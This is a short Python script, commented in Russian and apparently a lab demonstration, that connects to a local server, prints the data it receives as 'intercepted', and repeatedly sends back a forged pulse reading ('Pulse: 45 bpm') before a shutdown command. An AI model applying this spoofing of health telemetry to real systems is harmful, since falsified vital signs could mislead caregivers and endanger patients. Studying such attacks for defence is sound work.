import socket
import time

HOST = '127.0.0.1'
PORT = 65432

def client_attack():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print("[+] Подключено к серверу")

        try:
            # Перехват данных
            while True:
                data = s.recv(1024)
                print(f"[!] Перехвачено: {data.decode()}")

                # Подмена данных
                fake_data = "Pulse: 45 bpm"
                print(f"[!] Отправка поддельных данных: {fake_data}")
                s.sendall(fake_data.encode())
                time.sleep(1)

        except KeyboardInterrupt:
            print("[!] Отключение клиента")
            s.sendall(b"shutdown")

client_attack()

